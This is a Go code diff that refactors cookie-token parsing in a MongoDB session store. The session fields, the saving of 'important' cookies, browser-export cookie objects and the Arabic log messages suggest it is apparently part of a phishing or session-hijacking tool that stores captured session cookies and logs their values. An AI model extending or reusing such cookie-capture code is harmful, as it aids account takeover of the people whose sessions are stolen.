@@ -185,15 +185,22 @@ func convertFromMongoSession(ms *MongoSession) *Session {
 	cookieTokens := make(map[string]map[string]*CookieToken)
 	for domain, tokens := range ms.CookieTokens {
 		cookieTokens[domain] = make(map[string]*CookieToken)
-		for _, tokenInterface := range tokens {
-			if tokenMap, ok := tokenInterface.(map[string]interface{}); ok {
-				name := getStringValue(tokenMap["name"])
-				cookieTokens[domain][name] = &CookieToken{
-					Name:     name,
-					Value:    getStringValue(tokenMap["value"]),
-					Path:     getStringValue(tokenMap["path"]),
-					HttpOnly: getBoolValue(tokenMap["httpOnly"]),
-				}
+		for _, token := range tokens {
+			var name, value, path string
+			var httpOnly bool
+			if t, ok := token.(map[string]interface{}); ok {
+				name = getStringValue(t["name"])
+				value = getStringValue(t["value"])
+				path = getStringValue(t["path"])
+				httpOnly = getBoolValue(t["httpOnly"])
+			} else {
+				continue
+			}
+			cookieTokens[domain][name] = &CookieToken{
+				Name:     name,
+				Value:    value,
+				Path:     path,
+				HttpOnly: httpOnly,
 			}
 		}
 	}
@@ -552,15 +559,24 @@ func (m *MongoDatabase) UpdateSessionCookieTokens(sid string, tokens map[string]
 	for domain, domainTokens := range session.CookieTokens {
 		cookieTokens[domain] = []map[string]interface{}{}
 		for _, token := range domainTokens {
+			var name, value, path string
+			var httpOnly bool
+			if t, ok := token.(map[string]interface{}); ok {
+				name = getStringValue(t["name"])
+				value = getStringValue(t["value"])
+				path = getStringValue(t["path"])
+				httpOnly = getBoolValue(t["httpOnly"])
+			} else {
+				continue
+			}
 			hostOnly := !strings.HasPrefix(domain, ".")
 			cookieObj := map[string]interface{}{
-				"name":   token.Name,
-				"value":  token.Value,
+				"name":   name,
+				"value":  value,
 				"domain": domain,
-				"path":   token.Path,
-				// 'expirationDate' and 'secure' are not available, set to default
+				"path":   path,
 				"expirationDate": 0,
-				"httpOnly":       token.HttpOnly,
+				"httpOnly":       httpOnly,
 				"hostOnly":       hostOnly,
 				"secure":         false,
 				"session":        false,
@@ -594,23 +610,30 @@ func (m *MongoDatabase) UpdateSessionCookieTokens(sid string, tokens map[string]
 			cookieTokens[domain] = make([]map[string]interface{}, 0)
 		}
 		for _, token := range domainTokens {
-			name := token.Name
+			var name, value, path string
+			var httpOnly bool
+			if t, ok := token.(map[string]interface{}); ok {
+				name = getStringValue(t["name"])
+				value = getStringValue(t["value"])
+				path = getStringValue(t["path"])
+				httpOnly = getBoolValue(t["httpOnly"])
+			} else {
+				continue
+			}
 			isImportant := false
-			// التحقق مما إذا كان الكوكي مهماً
 			for _, importantName := range importantCookies {
 				if strings.EqualFold(name, importantName) {
 					isImportant = true
 					break
 				}
 			}
-			// حفظ الكوكي مع قيمته
 			cookieData := map[string]interface{}{
 				"name":   name,
-				"value":  token.Value,
+				"value":  value,
 				"domain": domain,
-				"path":   token.Path,
+				"path":   path,
 				"expirationDate": 0,
-				"httpOnly":       token.HttpOnly,
+				"httpOnly":       httpOnly,
 				"hostOnly":       !strings.HasPrefix(domain, "."),
 				"secure":         false,
 				"session":        false,
@@ -687,12 +710,18 @@ func (m *MongoDatabase) UpdateSessionCookieTokens(sid string, tokens map[string]
 		found := false
 		for domain, domainTokens := range tokens {
 			for _, token := range domainTokens {
-				name := token.Name
+				var name, value string
+				if t, ok := token.(map[string]interface{}); ok {
+					name = getStringValue(t["name"])
+					value = getStringValue(t["value"])
+				} else {
+					continue
+				}
 				if strings.EqualFold(name, cookieName) {
 					found = true
 					extraUpdate := bson.M{
 						"$set": bson.M{
-							fmt.Sprintf("important_cookies.%s.value", cookieName): token.Value,
+							fmt.Sprintf("important_cookies.%s.value", cookieName): value,
 							fmt.Sprintf("important_cookies.%s.domain", cookieName): domain,
 						},
 					}
@@ -700,7 +729,7 @@ func (m *MongoDatabase) UpdateSessionCookieTokens(sid string, tokens map[string]
 					if err != nil {
 						log.Error("[MongoDB] فشل حفظ الكوكي المهم %s كحقل منفصل: %v", cookieName, err)
 					} else {
-						log.Success("[MongoDB] تم حفظ الكوكي المهم %s = %s كحقل منفصل", cookieName, token.Value)
+						log.Success("[MongoDB] تم حفظ الكوكي المهم %s = %s كحقل منفصل", cookieName, value)
 					}
 					break
 				}
